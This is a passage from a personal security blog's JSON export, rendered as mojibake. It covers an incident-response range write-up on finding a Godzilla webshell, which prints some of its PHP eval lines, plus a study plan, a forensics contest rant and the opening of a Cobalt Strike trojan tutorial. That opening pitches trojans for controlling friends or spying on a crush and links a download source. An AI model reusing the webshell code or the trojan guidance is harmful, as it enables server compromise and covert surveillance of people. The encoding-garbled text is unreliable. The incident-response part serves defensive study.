(isset($_SESSION[$payloadName])){...}ï¼šæ£€æŸ¥ $payloadName å¯¹åº”çš„ä¼šè¯å˜é‡æ˜¯å¦å·²è®¾ç½®ã€‚\n\nif (strpos($payload,\"getBasicsInfo\")===false){...}ï¼šæ£€æŸ¥ $payload å˜é‡ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸² \"getBasicsInfo\"ã€‚\n\neval($payload);ï¼šå¦‚æœ $payload å˜é‡åŒ…å« \"getBasicsInfo\" å­—ç¬¦ä¸²ï¼Œåˆ™æ‰§è¡Œ $payload å˜é‡ä¸­çš„ PHP ä»£ç ã€‚\n\necho encode(@run($data),$key);ï¼šå¦‚æœ $data åŒ…å« \"getBasicsInfo\" å­—ç¬¦ä¸²ï¼Œåˆ™æ‰§è¡Œ @run($data) å‡½æ•°ï¼Œå¹¶å°†ç»“æœç¼–ç åè¾“å‡ºã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n\n                            ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºåšä¸»åŸåˆ›æ–‡ç« ï¼Œéµå¾ª CC 4.0 BY-SA ç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥å’Œæœ¬å£°æ˜ã€‚\n                        \nåŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/administratorlws/article/details/139521078\n```\n\nè¿™æ®µä»£ç çš„ç›®çš„æ˜¯æ¥æ”¶é€šè¿‡ `php://input` æµå‘é€çš„æ•°æ®ï¼Œå¯¹å…¶è¿›è¡Œç¼–ç ï¼Œå¹¶æ ¹æ®ä¼šè¯å˜é‡ä¸­çš„å†…å®¹æ‰§è¡Œç‰¹å®šçš„ PHP ä»£ç ã€‚è¿™é€šå¸¸ç”¨äºéšè—æ¶æ„ä»£ç æˆ–åé—¨ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„è¯·æ±‚è§¦å‘æ‰§è¡Œã€‚\n\n#### æ­¥éª¤#1.2é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}\n\né‡åˆ°è¿™ç§ç±»å‹çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å°±æ˜¯è¦åˆ†æä¸€ä¸‹æ˜¯ä»€ä¹ˆç±»å‹çš„webshellï¼Œå…¶å®å¼€å¤´ä¸‰å¥å°±å¯ä»¥åˆ†æå‡ºæ˜¯godzillaçš„webshelläº†ï¼›\n\nä¸ºä»€ä¹ˆè¿™æ ·è¯´ï¼Ÿ\n\nå“¥æ–¯æ‹‰ç—…æ¯’æ˜¯ä¸€ç§Javaåé—¨æœ¨é©¬ï¼Œé€šå¸¸ç”¨äºæ”»å‡»å¹¶æ§åˆ¶[WebæœåŠ¡å™¨](https://so.csdn.net/so/search?q=WebæœåŠ¡å™¨&spm=1001.2101.3001.7020)ã€‚ç‰¹å¾å°±åŒ…æ‹¬ï¼š\n\n```\n1. @session_start(); - å¼€å¯ä¸€ä¸ªä¼šè¯ã€‚\n2. @set_time_limit(0); - è®¾ç½®è„šæœ¬æ‰§è¡Œæ—¶é—´ä¸ºæ— é™ã€‚ \n3. @error_reporting(0); - å…³é—­æ‰€æœ‰é”™è¯¯æŠ¥å‘Šã€‚\n```\n\nè¿™äº›ä»£ç è¡Œä¸»è¦ç”¨äºéšè—ç—…æ¯’æ´»åŠ¨å¹¶ç¡®ä¿å…¶èƒ½å¤Ÿé•¿æ—¶é—´è¿è¡Œè€Œä¸è¢«å‘ç°ã€‚å“¥æ–¯æ‹‰ç—…æ¯’é€šå¸¸ä¼šé€šè¿‡Webshellæˆ–å…¶ä»–æ¼æ´æ³¨å…¥åˆ°æœåŠ¡å™¨ä¸­ï¼Œç„¶åä½¿ç”¨è¿™äº›å‘½ä»¤æ¥æ©ç›–å…¶å­˜åœ¨å¹¶æ‰§è¡Œè¿›ä¸€æ­¥çš„æ¶æ„æ“ä½œã€‚\n\næ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°å®ƒçš„githubåœ°å€å¹¶ä¸”è¿›è¡ŒMD5åŠ å¯†å³å¯ï¼›\n\n    Godzillaåœ°å€ï¼šhttps://github.com/BeichenDream/Godzilla\n#### æ­¥éª¤#1.3é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx\n\né‚£æ—¢ç„¶è¯´é»‘å®¢éšè—shelläº†ï¼Œé‚£æˆ‘ä»¬è‚¯å®šéœ€è¦ç”¨åˆ°å‘½ä»¤ls -laè¿›è¡ŒæŸ¥æ‰¾ï¼›\n\nç„¶åå‘ç°åœ¨æŒ¨ä¸ªæŸ¥æ‰¾çš„è¿‡ç¨‹ä¸­å‘ç°.Mysqlli.phpå¦‚æœæ™®é€šçš„lsæŸ¥çœ‹ç›®å½•æ˜¯æŸ¥ä¸å‡ºæ¥çš„ï¼Œå¿…é¡»ç”¨åˆ°ls -laæ‰è¡Œï¼Œæ‰€ä»¥å®ƒå°±æ˜¯éšè—äº†ï¼Œæˆ‘ä»¬ç›´æ¥å®šä½ä¸€äº›å®ƒçš„è·¯å¾„ï¼Œè¿›è¡ŒMD5åŠ å¯†å³å¯ï¼›\n\n```shell\nroot@ip-10-0-10-3:/var/www/html/include# cd Db\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls\nMysqli.php  Mysql.php  Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls -l\ntotal 24\n-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php\n-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls -a\n.  ..  .Mysqli.php  Mysqli.php\tMysql.php  Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# ls -la\ntotal 36\ndrwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .\ndrwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..\n-rw-r--r-- 1 www-data www-data  768 Aug  2  2023 .Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php\n-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php\nroot@ip-10-0-10-3:/var/www/html/include/Db# pwd\n/var/www/html/include/Db\n\n\næ³¨æ„ï¼šåœ¨finnalshellé‡Œé¢å¯ä»¥ç›´æ¥çœ‹åˆ°ç›®å½•ç»“æ„æ¯”å‘½ä»¤å¥½æ‰¾ æ›´æ–¹ä¾¿\n```\n\n#### æ­¥éª¤#1.4é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}\n\n#### \n\n##### ä»€ä¹ˆæ˜¯å…æ€é©¬ï¼Ÿ\n\nå…æ€é©¬ï¼ˆå…æ€ç—…æ¯’æˆ–å…æ€Webshellï¼‰æ˜¯æŒ‡ç»è¿‡ç‰¹æ®Šå¤„ç†å’Œæ··æ·†ï¼Œä½¿å…¶èƒ½å¤Ÿé¿å¼€æ€æ¯’è½¯ä»¶å’Œå®‰å…¨æ£€æµ‹å·¥å…·è¯†åˆ«çš„æ¶æ„è½¯ä»¶æˆ–åé—¨ç¨‹åºã€‚é»‘å®¢ä½¿ç”¨å„ç§æŠ€æœ¯æ‰‹æ®µï¼Œä½¿æ¶æ„ä»£ç çœ‹èµ·æ¥åƒæ˜¯æ­£å¸¸ä»£ç ï¼Œä»è€Œèº²é¿ç­¾åæ£€æµ‹å’ŒåŸºäºè§„åˆ™çš„å®‰å…¨æœºåˆ¶ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºWebshellå’Œå…¶ä»–åé—¨ç¨‹åºï¼Œç›®çš„æ˜¯ä¿æŒå¯¹å—å®³ç³»ç»Ÿçš„éšè”½è®¿é—®ã€‚\n\n\n\nå…æ€é©¬ï¼ˆå…æ€ç—…æ¯’æˆ–å…æ€Webshellï¼‰æ˜¯æŒ‡ç»è¿‡ç‰¹æ®Šå¤„ç†å’Œæ··æ·†ï¼Œä½¿å…¶èƒ½å¤Ÿé¿å¼€æ€æ¯’è½¯ä»¶å’Œå®‰å…¨æ£€æµ‹å·¥å…·è¯†åˆ«çš„æ¶æ„è½¯ä»¶æˆ–åé—¨ç¨‹åºã€‚é»‘å®¢ä½¿ç”¨å„ç§æŠ€æœ¯æ‰‹æ®µï¼Œä½¿æ¶æ„ä»£ç çœ‹èµ·æ¥åƒæ˜¯æ­£å¸¸ä»£ç ï¼Œä»è€Œèº²é¿ç­¾åæ£€æµ‹å’ŒåŸºäºè§„åˆ™çš„å®‰å…¨æœºåˆ¶ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºWebshellå’Œå…¶ä»–åé—¨ç¨‹åºï¼Œç›®çš„æ˜¯ä¿æŒå¯¹å—å®³ç³»ç»Ÿçš„éšè”½è®¿é—®ã€‚\n\n    å¸¸è§çš„å…æ€æŠ€æœ¯ï¼›\n    \n    ä»£ç æ··æ·†ï¼š\n        ä½¿ç”¨æ··æ·†å·¥å…·æˆ–æ‰‹åŠ¨æ··æ·†ä»£ç ï¼Œä½¿å…¶éš¾ä»¥è¢«ç›´æ¥é˜…è¯»å’Œåˆ†æã€‚\n    \n    ç¼–ç å’ŒåŠ å¯†ï¼š\n        ä½¿ç”¨Base64ã€ROT13ç­‰ç¼–ç æ–¹å¼æˆ–æ›´å¤æ‚çš„åŠ å¯†æŠ€æœ¯éšè—æ¶æ„ä»£ç ç‰‡æ®µã€‚\n    \n    åŠ¨æ€ç”Ÿæˆå’Œæ‰§è¡Œï¼š\n        é€šè¿‡åŠ¨æ€ç”Ÿæˆä»£ç å¹¶åœ¨è¿è¡Œæ—¶æ‰§è¡Œï¼Œç»•è¿‡é™æ€åˆ†æã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ eval()ã€create_function() ç­‰PHPå‡½æ•°ã€‚\n    \n    å¤šå±‚è§£ç ï¼š\n        å¤šå±‚ç¼–ç æˆ–åŠ å¯†ï¼Œå¢åŠ åˆ†æå’Œæ£€æµ‹çš„éš¾åº¦ã€‚\n    \n    ä½¿ç”¨åˆæ³•å‡½æ•°ï¼š\n        æ¶æ„ä»£ç åµŒå…¥åˆ°çœ‹ä¼¼åˆæ³•çš„ä»£ç ä¸­ï¼Œåˆ©ç”¨æ­£å¸¸çš„å‡½æ•°è°ƒç”¨æ‰§è¡Œæ¶æ„æ“ä½œã€‚\n    \n    æŸ¥æ‰¾å’Œå¤„ç†å…æ€é©¬çš„æ–¹æ³•ï¼›\n    \n    æ–‡ä»¶å®Œæ•´æ€§æ£€æŸ¥ï¼š\n        æ¯”è¾ƒå½“å‰æ–‡ä»¶ä¸å·²çŸ¥çš„è‰¯æ€§å¤‡ä»½æ–‡ä»¶ï¼Œå‘ç°è¢«ä¿®æ”¹æˆ–æ–°å¢çš„æ–‡ä»¶ã€‚\n    \n    ä»£ç å®¡æŸ¥ï¼š\n        æ‰‹åŠ¨æ£€æŸ¥å¯ç–‘æ–‡ä»¶ï¼Œå¯»æ‰¾æ··æ·†ã€ç¼–ç ã€åŠ å¯†å’ŒåŠ¨æ€æ‰§è¡Œçš„ä»£ç æ¨¡å¼ã€‚\n    \n    å®‰å…¨æ‰«æå·¥å…·ï¼š\n        ä½¿ç”¨é«˜çº§å®‰å…¨æ‰«æå·¥å…·ï¼Œè¿™äº›å·¥å…·ä½¿ç”¨è¡Œä¸ºåˆ†æå’Œæœºå™¨å­¦ä¹ æ¥æ£€æµ‹æ½œåœ¨çš„å…æ€é©¬ã€‚\n    \n    æ—¥å¿—åˆ†æï¼š\n        æŸ¥çœ‹æœåŠ¡å™¨è®¿é—®æ—¥å¿—å’Œé”™è¯¯æ—¥å¿—ï¼Œå¯»æ‰¾å¼‚å¸¸è®¿é—®å’Œæ‰§è¡Œæ¨¡å¼ã€‚\n        æ£€æŸ¥æ–‡ä»¶ä¿®æ”¹æ—¶é—´ï¼Œä¸æ­£å¸¸æ›´æ–°å‘¨æœŸä¸ç¬¦çš„æ–‡ä»¶å¯èƒ½æ˜¯å¯ç–‘çš„ã€‚\n    \n    åŸºäºç‰¹å¾çš„æ£€æµ‹ï¼š\n        ä½¿ç”¨YARAè§„åˆ™ç­‰ç‰¹å¾æ£€æµ‹å·¥å…·ï¼Œæ ¹æ®å·²çŸ¥çš„å…æ€é©¬ç‰¹å¾è¿›è¡Œæ‰«æã€‚\n    \n    æ€»ç»“ï¼šå…æ€é©¬é€šè¿‡é™æ€æ£€æµ‹æ˜¯æ£€æµ‹ä¸åˆ°çš„ï¼Œå› ä¸ºåœ¨å…æ€çš„è¿‡ç¨‹ä¸­å°†webshelçš„ç‰¹å¾å€¼ä»¥åŠç‰¹å¾å‡½æ•°éƒ½ç»™å»æ‰äº†ï¼Œå› ä¸ºwebshellæ‰§è¡Œä¼šåœ¨ç½‘ç«™æ—¥å¿—ç•™ä¸‹è®°å½•ï¼Œé‚£æˆ‘ä»¬å°±åˆ°ç½‘ç«™æ—¥å¿—é‡Œé¢çœ‹çœ‹æœ‰å•¥å¯ç–‘çš„è®°å½•ï¼Œè¿™é‡Œä¹Ÿé¡ºä¾¿è¯´ä¸€ä¸‹linuxçš„æ—¥å¿—å­˜æ”¾åœ¨/var/logç›®å½•ä¸‹ã€‚\n\nè¿™é‡Œæˆ‘ä»¬æ€»ç»“ä¸€ä¸‹å¸¸è§ç½‘ç«™æ—¥å¿—çš„è·¯å¾„ï¼š\n\nIISï¼ˆInternet Information Servicesï¼‰\n\nIISæ˜¯Windowsä¸Šçš„é»˜è®¤WebæœåŠ¡å™¨ï¼Œå…¶æ—¥å¿—æ–‡ä»¶é»˜è®¤å­˜å‚¨åœ¨ä»¥ä¸‹è·¯å¾„ï¼š\n\n    IIS 6.0 åŠæ›´æ—©ç‰ˆæœ¬ï¼š\n    \n    C:\\WINDOWS\\system32\\LogFiles\\W3SVC[SiteID]\\\n    \n    IIS 7.0 åŠæ›´é«˜ç‰ˆæœ¬ï¼š\n    \n    C:\\inetpub\\logs\\LogFiles\\W3SVC[SiteID]\\\n    \n    å…¶ä¸­ï¼Œ[SiteID] æ˜¯ç½‘ç«™çš„æ ‡è¯†ç¬¦ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªæ•°å­—ã€‚\n\nApache HTTP Server\n\nå¦‚æœåœ¨Windowsä¸Šå®‰è£…äº†Apacheï¼Œæ—¥å¿—æ–‡ä»¶é»˜è®¤å­˜å‚¨åœ¨å®‰è£…ç›®å½•ä¸‹çš„logsæ–‡ä»¶å¤¹ä¸­ï¼š\n\nC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\\n\næˆ–è€…\n\nC:\\Program Files\\Apache Group\\Apache2\\logs\\\n\nå…·ä½“è·¯å¾„å–å†³äºå®‰è£…æ—¶é€‰æ‹©çš„ä½ç½®ã€‚\n\nLinuxç³»ç»Ÿä¸­çš„ç½‘ç«™æ—¥å¿—è·¯å¾„\n\nApache HTTP Server\n\nåœ¨Linuxä¸Šï¼ŒApacheæ—¥å¿—æ–‡ä»¶é€šå¸¸ä½äºä»¥ä¸‹ç›®å½•ï¼š\n\n    è®¿é—®æ—¥å¿—ï¼š\n    \n    /var/log/apache2/access.log\n    \n    æˆ–è€…\n    \n    /var/log/httpd/access_log\n    \n    é”™è¯¯æ—¥å¿—ï¼š\n    \n    /var/log/apache2/error.log\n    \n    æˆ–\n    \n    /var/log/httpd/error_log\n\nä¸åŒçš„Linuxå‘è¡Œç‰ˆå¯èƒ½æœ‰ä¸åŒçš„ç›®å½•ã€‚ä¾‹å¦‚ï¼Œåœ¨Debian/Ubuntuä¸Šé€šå¸¸ä½¿ç”¨/var/log/apache2/ï¼Œè€Œåœ¨Red Hat/CentOSä¸Šé€šå¸¸ä½¿ç”¨/var/log/httpd/ã€‚\n\nNginx\n\nNginxæ˜¯å¦ä¸€ä¸ªæµè¡Œçš„WebæœåŠ¡å™¨ï¼Œé»˜è®¤çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„å¦‚ä¸‹ï¼š\n\n    è®¿é—®æ—¥å¿—ï¼š\n    \n    /var/log/nginx/access.log\n    \n    é”™è¯¯æ—¥å¿—ï¼š\n    \n    /var/log/nginx/error.log\n\n##### å¦‚ä½•æŸ¥çœ‹å’Œåˆ†ææ—¥å¿—æ–‡ä»¶ï¼Ÿ\n\n    Windowsï¼š\n        ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚Notepadã€Notepad++ï¼‰ç›´æ¥æ‰“å¼€æ—¥å¿—æ–‡ä»¶æŸ¥çœ‹ã€‚\n        å¯ä»¥ä½¿ç”¨IISç®¡ç†å™¨æŸ¥çœ‹IISæ—¥å¿—ã€‚\n    \n    Linuxï¼š\n    \n        ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æŸ¥çœ‹æ—¥å¿—ï¼Œä¾‹å¦‚ï¼š\n    \n        tail -f /var/log/apache2/access.log tail -f /var/log/nginx/access.log\n    \n        å¯ä»¥ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…·ï¼ˆå¦‚GoAccessã€AWStatsï¼‰ç”Ÿæˆå¯è§†åŒ–çš„æ—¥å¿—æŠ¥å‘Šã€‚\n\næ—¢ç„¶å®ƒç»è¿‡äº†å…æ€å¤„ç†ï¼Œé‚£ä¹ˆæœ¨é©¬çš„ç‰¹å¾å€¼ä»¥åŠç‰¹å¾å‡½æ•°åº”è¯¥éƒ½æ˜¯è¢«å»æ‰äº†ã€‚è¿™æ—¶æˆ‘ä»¬å†é€šè¿‡é™æ€æ£€æµ‹æ˜¯åŸºæœ¬æ£€æµ‹ä¸åˆ°çš„ï¼Œä»ä¸Šé¢æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæˆ‘ä»¬åªæ‰¾åˆ°äº†ä¸‰ä¸ªé©¬ã€‚è€Œä¸”ä¸Šé¢æˆ‘ä»¬è¯´äº†webshellæ‰§è¡Œä¼šåœ¨ç½‘ç«™æ—¥å¿—ç•™ä¸‹è®°å½•ï¼Œé‚£æˆ‘ä»¬å°±åˆ°ç½‘ç«™æ—¥å¿—é‡Œé¢çœ‹çœ‹æœ‰å•¥å¯ç–‘çš„è®°å½•ã€‚\næˆ‘ä»¬åˆ°apache2ç›®å½•ä¸‹é¢æŸ¥çœ‹ä¸€ä¸‹access.logæ—¥å¿—ï¼ŒæŸ¥çœ‹åˆ†æä¸€ä¸‹ï¼›ï¼ˆå› ä¸ºæ˜¯æ—¥å¿—æ‰€ä»¥è®°å½•æœ‰ç‚¹å¤šï¼‰\n\n![https://i-blog.csdnimg.cn/blog_migrate/058e435a4bcada8e8a8295312016d4fa.png#pic_center](http://images.lwwww.top/images/20250305110800386.png)\n\n\n\nå¤§éƒ¨åˆ†éƒ½æ˜¯é‡å¤çš„åªæœ‰å°‘æ•°ä¸ä¸€æ ·çš„ï¼› æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªåä¸ºtop.phpçš„æ–‡ä»¶æ‰§è¡Œäº†phpinfo()ï¼›ä¸”è¿”å›å€¼ä¸º200ï¼Œæœ‰ç‚¹å¯ç–‘ã€‚å»æ‰¾åˆ°ç›¸å¯¹åº”çš„æ–‡ä»¶å‘ç°æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶æ¥ã€‚  \n\n![](http://images.lwwww.top/images/20250305110757731.png)\n\n\n\nç»§ç»­å¾€ä¸‹ç¿»ï¼Œåˆå‘ç°ä¸€ä¸ªè¾ƒä¸ºå¯ç–‘çš„æ–‡ä»¶ï¼Œåˆ°æ­¤ç›®å½•ä¸‹é¢æŸ¥çœ‹è¯¥æ–‡ä»¶ã€‚ ç›®å½•ï¼š/wap/top.php \n\n\n\n![](http://images.lwwww.top/images/20250305110802248.png)\n\n åŸæ¥æ˜¯ä¸ªæ¶æ„æ–‡ä»¶ï¼Œæœ€åæŠŠè·¯å¾„è¿›è¡Œmd5è¿›è¡ŒåŠ å¯†å³å¯ï¼› è·¯å¾„ï¼š/var/www/html/wap/top.php \n\n##### ä¸ºä»€ä¹ˆå¯ä»¥ç¡®è®¤æ˜¯æ¶æ„æ–‡ä»¶ï¼Ÿ\n\næ··æ·†å’Œéšè—ï¼š\n\n    ä½¿ç”¨Base64ç¼–ç å’Œå­—ç¬¦å¼‚æˆ–æ“ä½œæ¥æ··æ·†ä»£ç ã€‚è¿™äº›æŠ€æœ¯é€šå¸¸ç”¨äºéšè—æ¶æ„ä»£ç ï¼Œé¿å…è¢«ç›´æ¥æ£€æµ‹åˆ°ã€‚\n\nåŠ¨æ€æ‰§è¡Œï¼š\n\n    åŠ¨æ€ç”Ÿæˆå¹¶è°ƒç”¨å‡½æ•°ã€‚è¿™ç§æ¨¡å¼å…è®¸æ”»å‡»è€…é€šè¿‡URLå‚æ•°ä¼ é€’ä»»æ„ä»£ç å¹¶åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œå…·æœ‰æå¤§çš„å±é™©æ€§ã€‚\n\nå¤–éƒ¨è¾“å…¥ï¼š\n\n    ä½¿ç”¨$_GETå‚æ•°æ¥æ§åˆ¶ä»£ç è¡Œä¸ºã€‚é€šè¿‡å¤–éƒ¨è¾“å…¥æ¥å†³å®šä»£ç é€»è¾‘ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥è¿œç¨‹æ§åˆ¶æœåŠ¡å™¨ï¼Œæ‰§è¡Œä»»æ„PHPä»£ç ã€‚\n![](http://images.lwwww.top/images/20250305110804008.png)\n\n\n\n\n\nè¿˜æœ‰ä¸€ç§æ€è·¯å’Œåšæ³•å°±æ˜¯æŠŠvaræ–‡ä»¶ä¸‹è½½ä¸‹æ¥å‹ç¼©zipæ‰”åˆ°åœ¨çº¿æŸ¥æ€ç½‘ç«™é‡Œé¢ï¼Œè®©ä»–ä»¬å»æŸ¥æ€\n\nåŒæ ·çš„é“ç†åœ¨çº¿ä¸‹åº”è¯¥æ˜¯ç”¨Dç›¾æŸ¥æ€\n\n\n\n\n\n","tags":["-WP -ç„æœº -åº”æ€¥å“åº”"]},{"title":"3æœˆ3--3æœˆ8è®¡åˆ’ä»»åŠ¡","url":"/2025/03/02/3æœˆ3-3æœˆ8è®¡åˆ’ä»»åŠ¡/","content":"\nDemonè¯´è¦ç›‘ç£æˆ‘\n\n- [ ] æ¯å¤©åšæŒèƒŒå•è¯35+ç„¶åå¤ä¹ å•è¯50+ï¼Œå°½é‡çº¸è´¨ç”µå­åŒæ­¥ç§¯ç´¯ï¼Œè‹±è¯­è¯¾ä¹Ÿè¦å……åˆ†åˆ©ç”¨èµ·æ¥\n\n- [ ] ä¸€å‘¨åšæŒè¿åŠ¨5å¤©ï¼Œä¸èƒ½æ¯”ä¸Šå‘¨èƒ–\n\n- [ ] æ ¹æ®Demonçš„ä»»åŠ¡å®Œæˆå››çº§é¢˜ç›®\n\n- [ ] å®Œæˆç„æœºé¶åœºç¬¬ä¸€ç« ï¼Œå¹¶ä¸”å†™blogè®°å½•ç„æœºçš„wp\n\n- [ ] ç»™å­¦å¼Ÿä»¬ç”³è¯·æ™šè‡ªä¹ å‡æ¡\n\n- [ ] ç»™åå­å§èµ·æ­¥å–è¯å’Œåº”æ€¥å“åº”\n\n- [ ] æ¯å¤©åšæŒä¸ƒç‚¹èµ·åºŠç„¶åç¡è§‰æœ€æ™šä¸è¶…è¿‡12ç‚¹åŠ\n\n- [ ] æœ‰æ¦‚ç‡è®ºå’Œæ•°æ®åº“è¯¾çš„å½“å¤©è¦åŠæ—¶å¤ä¹ æŒæ¡ï¼Œç„¶åçœ‹è§†é¢‘æˆ–è€…åšé¢˜æ¶ˆåŒ–å¸æ”¶ï¼Œä¿è¯è‡ªå·±çš„è¿›åº¦åœ¨è€å¸ˆå‰é¢å¹¶ä¸”å®Œæˆæ¯å¤©çš„ä½œä¸š\n\n- [ ] æ¯å¤©æŠ–éŸ³é™æ—¶1h\n\n- [ ] burpsuiteé¶åœºè¿™ä¸ªæœˆå…¨éƒ¨æ‰“![96e121fd4d70503140822347948880a](http://images.lwwww.top/images/20250302231035103.jpg)\n\n  \n","tags":["-æ—¥å¸¸ -è®¡åˆ’"]},{"title":"ç¬è±¸æ¯å–è¯å†ä¹Ÿä¸å¤ç°","url":"/2025/02/22/ç¬è±¸æ¯å–è¯å¤ç°/","content":"\næ²¡åˆ«çš„è¯ï¼Œå°±æ˜¯çº¯çº¯åç‰¢ï¼Œå¤ªéš¾å—äº†ã€‚æ„Ÿè§‰å¾ˆå¤šé¢˜éƒ½æ˜¯é€åˆ†çš„ï¼Œä½†æ˜¯æˆ‘å¯¹å–è¯æŒ‚è½½éƒ½å¤ªä¸ç†Ÿæ‚‰äº†ï¼Œåªä¼šè®¡ç®—æœºå–è¯ä½†æ˜¯è¿˜è¢«å¯†ç å¡æ­»æˆ‘çœŸæ˜¯è¦çº¢æ¸©äº†ï¼Œçœ‹ç€é¢˜ç›®æ˜¯çœŸå¥½åˆæœ‰å¼•å¯¼æ€§ï¼Œå¯¹è‡ªå·±çš„æå‡è‚¯å®šå¾ˆå¤§ä½†æ˜¯æˆ‘çœŸæ˜¯å—ä¸äº†è‡ªå·±å•¥éƒ½ä¸ä¼šäº†ã€‚FTKæŒ‚è½½ VCæŒ‚è½½ç„¶åæ˜¯å•¥å“‡ï¼Œå®‰å“æ€ä¹ˆä»¿çœŸï¼Ÿ\n\nå´©æºƒï¼Œæ¯”èµ›ä¹‹å‰æˆ‘è¿˜è§‰å¾—æ²¡å•¥é—®é¢˜åšå‡ºæ¥ä¸€åŠ....\n\n\n\nå¤ç°ä¹Ÿä¸å¤ç°äº†ï¼Œçº¯å±\n\næ²¡è§è¿‡é¢˜ç›®å±æˆè¿™æ ·ç¯å¢ƒå±æˆè¿™æ ·çš„ã€‚ç«çœ¼å…¨æ¢­å“ˆäº†ï¼Œå‡ ä¸ªç”¨sqlliteæ‰¾çš„å¯†ç å•Šï¼Ÿ\n\næˆ‘å°±å½“åƒäº†ä¸€ä¸‹åˆå±ã€‚\n\n\n\nä¸€å‘¨åï¼š\n\nç¨å¾®å†·é™äº†ç‚¹ å…¶å®å°±æ˜¯è‡ªå·±æ°´å¹³ä¸å¤ªå¤Ÿ è¦é™å¿ƒæ½œä¿®äº†ï¼Œå·¥å…·å›ºç„¶å¥½ ä½†æˆ‘ä»ç„¶ä¼šç»§ç»­å»æ²‰æ·€æ‰‹æ“ ä¸èƒ½èƒŒå¼ƒè‡ªå·±çš„ä¿¡ä»° \n\nè€Œä¸”æˆ‘ç°åœ¨ä¹Ÿæœ‰ç«çœ¼äº†å“ˆå“ˆå“ˆ\n\n![image-20250307074437036](http://images.lwwww.top/images/20250307074440703.png)\n\n","tags":["-wp -å–è¯"]},{"title":"CSåˆ¶ä½œæœ¨é©¬çš„ç®€æ˜“å°æ•™ç¨‹ï¼ˆçº¯å¨±ä¹ä¸è¦æ‹¿æ¥å¹²åäº‹ï¼ï¼‰","url":"/2025/02/18/CSåˆ¶ä½œæœ¨é©¬çš„ç®€æ˜“å°æ•™ç¨‹ï¼ˆçº¯å¨±ä¹ä¸è¦æ‹¿æ¥å¹²åäº‹ï¼ï¼‰/","content":"\næƒ³è¦åˆ¶ä½œå°æœ¨é©¬æ§åˆ¶ä¸€ä¸‹ä½ çš„äº²æœ‹å¥½å‹æˆ–è€…çª¥æ¢ä¸€ä¸‹å¥³ç¥çš„éšç§å—\n\né‚£å°±è®©æˆ‘æ¥æ•™æ•™ä½ \n\né¦–å…ˆå°±æ˜¯å¾—æœ‰ä¸ªVPSäº‘æœåŠ¡å™¨ï¼Œæˆ‘å°±åªå­¦äº†csåˆ¶ä½œexeæ–‡ä»¶çš„æœ¨é©¬è¿˜æœ‰ä¸€ç§shellcodeæˆ‘è¿˜æ²¡ç ”ç©¶æ‰€ä»¥å°±ä»¥windowä¸‹çš„exeå½“ä¾‹å­å’¯\n\nå…ˆå»ææ ¸é‚£è¾¹æŠŠè¿™ä¸ªcsä¸‹ä¸Šhttps://get-shell.com/1554.html\n\nå¼ºçƒˆæ¨èææ ¸ç½‘ç«™çœŸçš„å¾ˆå¥½ğŸ¤©\n\nç„¶åå…ˆè¯´ä¸€ä¸‹è¿™ä¸ªçš„åŸç†ï¼Œæˆ‘æ‰¾åˆ°çš„å‡ ä¸ªæ•™ç¨‹å…¨æ˜¯æ­¥éª¤æ²¡æœ‰åŸç†å¯¼è‡´æˆ‘ç¬¨ç¬¨çš„åœ¨kalié‡Œé¢æ¯é¥¬\n\ncsçš„ä½¿ç”¨æ˜¯åˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„ï¼ŒæœåŠ¡ç«¯å¿…é¡»æ˜¯linuxç¯å¢ƒï¼Œç„¶åæŒ‰ç…§å…¬ç½‘çš„æ¥çš„è¯ï¼Œå°±æ˜¯éœ€è¦ä½ åœ¨Linuxç¯å¢ƒä¸‹å¼€å¯serverçš„æœåŠ¡ï¼Œè®©cså®¢æˆ·ç«¯èƒ½å¤Ÿå’ŒæœåŠ¡ç«¯è¿æ¥ä¸Šå»ï¼Œåªæœ‰è¿™æ ·csæ‰èƒ½å¯åŠ¨ï¼Œ\n\nç„¶åæ”¾å‡ 